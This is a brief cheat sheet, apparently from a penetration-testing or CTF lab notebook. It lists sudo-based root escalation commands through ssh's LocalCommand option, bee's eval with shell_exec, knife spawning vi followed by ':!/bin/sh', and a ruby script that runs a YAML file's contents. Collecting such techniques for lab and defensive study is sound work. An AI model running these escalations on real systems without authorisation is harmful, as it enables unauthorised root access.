/usr/bin/ssh

```
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh josh@10.129.229.88
```

ssh -o can make permitlocalcommand=yes, which allow u to run /bin/sh leading to root

---

/usr/local/bin/bee

[[Bee]]

```
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
```

---

[[Knife]]

/usr/bin/knife

```
sudo knife data bag create 1 2 -e vi
```

This opens up the vim editor. We type the below character sequence in the editor to get a shell as root.

```
:!/bin/sh
```

---

[[Ruby]]

```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

executes whatever is inside dependencies.yml

---



